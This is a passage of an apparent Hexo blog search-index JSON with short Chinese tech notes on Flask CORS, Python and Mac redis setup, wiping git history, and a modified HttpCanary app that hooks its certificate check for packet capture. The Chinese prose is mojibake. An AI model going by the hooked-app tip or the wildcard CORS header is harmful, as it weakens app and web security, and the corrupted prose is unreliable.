æœ€è¿‘å‘ç°äº†é’ˆå¯¹è¯ä¹¦é—®é¢˜çš„ä¿®æ”¹ç‰ˆï¼Œhookè¯ä¹¦å®‰è£…éªŒè¯å‡½æ•°ï¼Œä½¿è½¯ä»¶å¾—åˆ°çš„æ•°æ®å§‹ç»ˆä¸ºå·²å®‰è£…è¯ä¹¦ï¼Œè¿™æ ·å°±å¯ä»¥å¯¼å‡ºè¯ä¹¦å»è®¾ç½®é‡Œå®‰è£…ã€‚æ¬è¿æ–‡ä»¶ä¸‹è½½åœ°å€ã€‚ âš ï¸æ³¨ï¼š è¯ä¹¦å¯¼å‡ºæ–¹æ³•ï¼š è®¾ç½® -&gt; HttpCanaryæ ¹è¯ä¹¦ -&gt; å¯¼å‡ºHttpCanaryæ ¹è¯ä¹¦ -&gt; Privacy Enhanced Mai(.pem) å¯¼å‡ºä½ç½®ä¸º~/HttpCanary/certs è®¾ç½®ä¸­å®‰è£…è¯ä¹¦ ä¸åŒå“ç‰Œæ‰‹æœºå­˜åœ¨å·®å¼‚ï¼Œé€šå¸¸åœ¨å®‰å…¨åˆ†ç±»ä¸­ï¼Œæˆ–ç›´æ¥åœ¨è®¾ç½®ä¸­æœç´¢å®‰è£…è¯ä¹¦ã€CAè¯ä¹¦ç­‰å…³é”®å­—ã€‚","categories":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"æŠ“åŒ…","slug":"æŠ“åŒ…","permalink":"https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"}]},{"title":"Flaskè·¨åŸŸæ–¹æ¡ˆ","slug":"Flaskè·¨åŸŸæ–¹æ¡ˆ","date":"2022-02-08T08:28:55.000Z","updated":"2022-03-21T08:54:32.520Z","comments":true,"path":"2022/02/08/Flaskè·¨åŸŸæ–¹æ¡ˆ/","link":"","permalink":"https://qilianshuo.github.io/2022/02/08/Flask%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/","excerpt":"å¾ˆå®¹æ˜“æœç´¢åˆ°å¤šç§è§£å†³æ–¹æ³•ï¼Œæš‚å…ˆè®°å½•å‡ ç§æœ€ç®€å•çš„ã€‚ ä¸ºresponseæ·»åŠ headers ä½¿ç”¨make_responseå…ˆåˆ›å»ºå“åº”ï¼Œå†ç»™å“åº”æ·»åŠ headers 12345@app.route(&#x27;/&#x27;)def index(): rsp = make_response(&#x27;Hello world.&#x27;) rsp.headers[&#x27;Access-Control-Allow-Origin&#x27;] = &#x27;*&#x27; return rsp returnå“åº”ä¸‰å…ƒç»„(response, status, headers)","text":"å¾ˆå®¹æ˜“æœç´¢åˆ°å¤šç§è§£å†³æ–¹æ³•ï¼Œæš‚å…ˆè®°å½•å‡ ç§æœ€ç®€å•çš„ã€‚ ä¸ºresponseæ·»åŠ headers ä½¿ç”¨make_responseå…ˆåˆ›å»ºå“åº”ï¼Œå†ç»™å“åº”æ·»åŠ headers 12345@app.route(&#x27;/&#x27;)def index(): rsp = make_response(&#x27;Hello world.&#x27;) rsp.headers[&#x27;Access-Control-Allow-Origin&#x27;] = &#x27;*&#x27; return rsp returnå“åº”ä¸‰å…ƒç»„(response, status, headers) 123@app.route(&#x27;/&#x27;)def index(): return &#x27;Hello world&#x27;, 200, &#123;&#x27;Access-Control-Allow-Origin&#x27;:&#x27;*&#x27;&#125; æ³¨å†Œè¯·æ±‚å›è°ƒæ·»åŠ headerså½“å¤§é‡è·¯ç”±éƒ½éœ€è¦å…è®¸è·¨åŸŸæ—¶ï¼Œä¸ºæ¯ä¸ªè·¯ç”±é€ä¸ªæ·»åŠ å˜å¾—éå¸¸éº»çƒ¦ä¸”ä¸æ˜“ç»´æŠ¤ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨Flaskæä¾›çš„å›è°ƒæ¥å£ä¸ºè¯·æ±‚æ³¨å†Œå›è°ƒï¼Œè‡ªåŠ¨æ·»åŠ Access-Control-Allow-Originçš„headerã€‚ 123456@app.after_requestdef headers_hook(response): if request.method == &#x27;GET&#x27;: response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = &#x27;*&#x27; return response# åŒæ ·å¯ä»¥å°†appæ›¿æ¢ä¸ºè“å›¾åœ¨å±€éƒ¨å¼€å¯è·¨åŸŸ","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://qilianshuo.github.io/tags/Flask/"},{"name":"è·¨åŸŸ","slug":"è·¨åŸŸ","permalink":"https://qilianshuo.github.io/tags/%E8%B7%A8%E5%9F%9F/"}]},{"title":"Pythonä½¿ç”¨redis","slug":"Pythonä½¿ç”¨redis","date":"2022-02-06T08:42:53.000Z","updated":"2022-03-21T08:53:34.912Z","comments":true,"path":"2022/02/06/Pythonä½¿ç”¨redis/","link":"","permalink":"https://qilianshuo.github.io/2022/02/06/Python%E4%BD%BF%E7%94%A8redis/","excerpt":"å®‰è£…Redisæ¨¡å—Pythonæ— å†…ç½®rediså·¥å…·ï¼Œéœ€å…ˆå®‰è£…redisæ¨¡å—ï¼š 1pip3 install redis è¿æ¥æ•°æ®åº“12345import redisr = redis.StrictRedis(host=&#x27;localhost&#x27;, port=6379, decode_responses=True)r.set(&#x27;name&#x27;, &#x27;Lihua&#x27;)print(r[&#x27;name&#x27;])print(r.get(&#x27;name&#x27;)","text":"å®‰è£…Redisæ¨¡å—Pythonæ— å†…ç½®rediså·¥å…·ï¼Œéœ€å…ˆå®‰è£…redisæ¨¡å—ï¼š 1pip3 install redis è¿æ¥æ•°æ®åº“12345import redisr = redis.StrictRedis(host=&#x27;localhost&#x27;, port=6379, decode_responses=True)r.set(&#x27;name&#x27;, &#x27;Lihua&#x27;)print(r[&#x27;name&#x27;])print(r.get(&#x27;name&#x27;) redis æä¾›ä¸¤ä¸ªç±» Redis å’Œ StrictRedis, StrictRedis ç”¨äºå®ç°å¤§éƒ¨åˆ†å®˜æ–¹çš„å‘½ä»¤ï¼ŒRedis æ˜¯ StrictRedis çš„å­ç±»ï¼Œç”¨äºå‘åå…¼ç”¨æ—§ç‰ˆæœ¬ã€‚ redis å–å‡ºçš„ç»“æœé»˜è®¤æ˜¯å­—èŠ‚ï¼Œå¯ä»¥è®¾å®š decode_responses=True æ”¹æˆå­—ç¬¦ä¸²ã€‚ è¿æ¥æ± redis-py ä½¿ç”¨ connection pool æ¥ç®¡ç†å¯¹ä¸€ä¸ª redis server çš„æ‰€æœ‰è¿æ¥ï¼Œé¿å…æ¯æ¬¡å»ºç«‹ã€é‡Šæ”¾è¿æ¥çš„å¼€é”€ã€‚ é»˜è®¤ï¼Œæ¯ä¸ªRediså®ä¾‹éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªè‡ªå·±çš„è¿æ¥æ± ã€‚å¯ä»¥ç›´æ¥å»ºç«‹ä¸€ä¸ªè¿æ¥æ± ï¼Œç„¶åä½œä¸ºå‚æ•° Redisï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å¤šä¸ª Redis å®ä¾‹å…±äº«ä¸€ä¸ªè¿æ¥æ± ã€‚ 123import redispool = redis.ConnectionPool(host=&#x27;localhost&#x27;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool) Stringæ“ä½œTODOâ€¦â€¦ Listæ“ä½œTODOâ€¦â€¦ Setæ“ä½œâ€¦â€¦TODOâ€¦â€¦ å¸¸ç”¨æ“ä½œéå†å…¨éƒ¨keyâ€¦â€¦","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"redis","slug":"redis","permalink":"https://qilianshuo.github.io/tags/redis/"},{"name":"Python","slug":"Python","permalink":"https://qilianshuo.github.io/tags/Python/"}]},{"title":"Macå®‰è£…Reidså¹¶é…ç½®","slug":"Macå®‰è£…Reidså¹¶é…ç½®","date":"2022-02-04T13:43:24.000Z","updated":"2022-03-21T08:53:51.859Z","comments":true,"path":"2022/02/04/Macå®‰è£…Reidså¹¶é…ç½®/","link":"","permalink":"https://qilianshuo.github.io/2022/02/04/Mac%E5%AE%89%E8%A3%85Reids%E5%B9%B6%E9%85%8D%E7%BD%AE/","excerpt":"å®‰è£… ä½¿ç”¨Homebrewå®‰è£… å®‰è£…å‘½ä»¤ï¼š 1brew install redis 12345678910==&gt; Downloading https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles/redis-6.2.6.monte######################################################################## 100.0%==&gt; Pouring redis-6.2.6.monterey.bottle.tar.gz==&gt; CaveatsTo restart redis after an upgrade: brew services restart redisOr, if you don&#x27;t want/need a background service you can just run: /usr/local/opt/redis/bin/redis-server /usr/local/etc/redis.conf==&gt; SummaryğŸº /usr/local/Cellar/redis/6.2.6: 14 files, 2.0MB","text":"å®‰è£… ä½¿ç”¨Homebrewå®‰è£… å®‰è£…å‘½ä»¤ï¼š 1brew install redis 12345678910==&gt; Downloading https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles/redis-6.2.6.monte######################################################################## 100.0%==&gt; Pouring redis-6.2.6.monterey.bottle.tar.gz==&gt; CaveatsTo restart redis after an upgrade: brew services restart redisOr, if you don&#x27;t want/need a background service you can just run: /usr/local/opt/redis/bin/redis-server /usr/local/etc/redis.conf==&gt; SummaryğŸº /usr/local/Cellar/redis/6.2.6: 14 files, 2.0MB ä¸‹è½½binæ–‡ä»¶å¹¶é…ç½®ç¯å¢ƒå˜é‡ æ—¥åæ›´æ–°(///â–½///) é…ç½®é…ç½®æ–‡ä»¶è·¯å¾„ï¼š /usr/local/opt/redis/bin/redis-serverã€ /usr/local/etc/redis.conf é…ç½®é¡¹ è¯´æ˜ port 6379 æŒ‡å®š Redis ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ç«¯å£ä¸º 6379 bind 127.0.0.1 ç»‘å®šçš„ä¸»æœºåœ°å€ databases 16 è®¾ç½®æ•°æ®åº“çš„æ•°é‡ï¼Œé»˜è®¤æ•°æ®åº“ä¸º0ï¼Œå¯ä»¥ä½¿ç”¨SELECT å‘½ä»¤åœ¨è¿æ¥ä¸ŠæŒ‡å®šæ•°æ®åº“id save &lt;seconds&gt; &lt;changes&gt; æŒ‡å®šåœ¨å¤šé•¿æ—¶é—´å†…ï¼Œæœ‰å¤šå°‘æ¬¡æ›´æ–°æ“ä½œï¼Œå°±å°†æ•°æ®åŒæ­¥åˆ°æ•°æ®æ–‡ä»¶ï¼Œå¯ä»¥å¤šä¸ªæ¡ä»¶é…åˆ rdbcompression yes æŒ‡å®šå­˜å‚¨è‡³æœ¬åœ°æ•°æ®åº“æ—¶æ˜¯å¦å‹ç¼©æ•°æ®ï¼Œé»˜è®¤ä¸º yesï¼ŒRedis é‡‡ç”¨ LZF å‹ç¼©ï¼Œå¦‚æœä¸ºäº†èŠ‚çœ CPU æ—¶é—´ï¼Œå¯ä»¥å…³é—­è¯¥é€‰é¡¹ï¼Œä½†ä¼šå¯¼è‡´æ•°æ®åº“æ–‡ä»¶å˜çš„å·¨å¤§ dbfilename dump.rdb æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤å€¼ä¸º dump.rdb dir ./ æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½• include /path/to/local.conf æŒ‡å®šåŒ…å«å…¶å®ƒçš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸»æœºä¸Šå¤šä¸ªRediså®ä¾‹ä¹‹é—´ä½¿ç”¨åŒä¸€ä»½é…ç½®æ–‡ä»¶ï¼Œè€ŒåŒæ—¶å„ä¸ªå®ä¾‹åˆæ‹¥æœ‰è‡ªå·±çš„ç‰¹å®šé…ç½®æ–‡ä»¶ ç»´æŠ¤ æŸ¥çœ‹redisè¿›ç¨‹ 1ps axu | grep redis å¯åŠ¨ã€å…³é—­redisæœåŠ¡ 123brew services start redisbrew services stop redisbrew services restart redis â€¦â€¦","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://qilianshuo.github.io/tags/Redis/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"GitHubåˆ é™¤æ‰€æœ‰æäº¤å†å²","slug":"GitHubåˆ é™¤æ‰€æœ‰æäº¤å†å²","date":"2022-02-04T04:02:24.000Z","updated":"2022-03-21T08:55:50.096Z","comments":true,"path":"2022/02/04/GitHubåˆ é™¤æ‰€æœ‰æäº¤å†å²/","link":"","permalink":"https://qilianshuo.github.io/2022/02/04/GitHub%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2/","excerpt":"æ•ˆæœå°†ä»£ç ä¿æŒåœ¨å½“å‰çŠ¶æ€ï¼Œæ¸…ç©ºcommit historyã€‚ æ€è·¯åˆ›å»ºæ–°åˆ†æ”¯ -&gt; å°†æ–‡ä»¶æ·»åŠ åˆ°æ–°åˆ†æ”¯ -&gt; æäº¤æ›´æ”¹ -&gt; åˆ é™¤æ—§masteråˆ†æ”¯ -&gt; é‡å‘½åæ–°åˆ†æ”¯ -&gt; å¼ºåˆ¶æ›´æ–°ä»“åº“ æ­¥éª¤","text":"æ•ˆæœå°†ä»£ç ä¿æŒåœ¨å½“å‰çŠ¶æ€ï¼Œæ¸…ç©ºcommit historyã€‚ æ€è·¯åˆ›å»ºæ–°åˆ†æ”¯ -&gt; å°†æ–‡ä»¶æ·»åŠ åˆ°æ–°åˆ†æ”¯ -&gt; æäº¤æ›´æ”¹ -&gt; åˆ é™¤æ—§masteråˆ†æ”¯ -&gt; é‡å‘½åæ–°åˆ†æ”¯ -&gt; å¼ºåˆ¶æ›´æ–°ä»“åº“ æ­¥éª¤ åˆ›å»ºæ–°åˆ†æ”¯ 1git checkout --orphan latest_branch å°†æ–‡ä»¶æ·»åŠ åˆ°æ–°åˆ†æ”¯ 1git add -A æäº¤æ›´æ”¹ 1git commit -am &quot;Init new branch&quot; åˆ é™¤æ—§masteråˆ†æ”¯ 1git branch -D master é‡å‘½åæ–°åˆ†æ”¯ 1git branch -m master å¼ºåˆ¶æ›´æ–°ä»“åº“ 1git push -f origin master","categories":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"git","slug":"git","permalink":"https://qilianshuo.github.io/tags/git/"}]},{"title":"Hello World","slug":"hello-world","date":"2022-02-04T03:29:52.358Z","updated":"2022-02-04T03:29:52.358Z","comments":true,"path":"2022/02/04/hello-world/","link":"","permalink":"https://qilianshuo.github.io/2022/02/04/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"},{"name":"è¸©å‘è®°å½•ğŸ“","slug":"è¸©å‘è®°å½•ğŸ“","permalink":"https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://qilianshuo.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"å¯†ç ","slug":"å¯†ç ","permalink":"https://qilianshuo.github.io/tags/%E5%AF%86%E7%A0%81/"},{"name":"æŠ“åŒ…","slug":"æŠ“åŒ…","permalink":"https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"},{"name":"å°ç¨‹åº","slug":"å°ç¨‹åº","permalink":"https://qilianshuo.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"jså¼‚æ­¥","slug":"jså¼‚æ­¥","permalink":"https://qilianshuo.github.io/tags/js%E5%BC%82%E6%AD%A5/"},{"name":"ç´ æ•°","slug":"ç´ æ•°","permalink":"https://qilianshuo.github.io/tags/%E7%B4%A0%E6%95%B0/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://qilianshuo.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"RSSI","slug":"RSSI","permalink":"https://qilianshuo.github.io/tags/RSSI/"},{"name":"å®šä½","slug":"å®šä½","permalink":"https://qilianshuo.github.io/tags/%E5%AE%9A%E4%BD%8D/"},{"name":"Mac OS","slug":"Mac-OS","permalink":"https://qilianshuo.github.io/tags/Mac-OS/"},{"name":"å¿«æ·é”®","slug":"å¿«æ·é”®","permalink":"https://qilianshuo.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"æ­£åˆ™","slug":"æ­£åˆ™","permalink":"https://qilianshuo.github.io/tags/%E6%AD%A3%E5%88%99/"},{"name":"Safari","slug":"Safari","permalink":"https://qilianshuo.github.io/tags/Safari/"},{"name":"Flask","slug":"Flask","permalink":"https://qilianshuo.github.io/tags/Flask/"},{"name":"è·¨åŸŸ","slug":"è·¨åŸŸ","permalink":"https://qilianshuo.github.io/tags/%E8%B7%A8%E5%9F%9F/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"redis","slug":"redis","permalink":"https://qilianshuo.github.io/tags/redis/"},{"name":"Python","slug":"Python","permalink":"https://qilianshuo.github.io/tags/Python/"},{"name":"Redis","slug":"Redis","permalink":"https://qilianshuo.github.io/tags/Redis/"},{"name":"git","slug":"git","permalink":"https://qilianshuo.github.io/tags/git/"}]}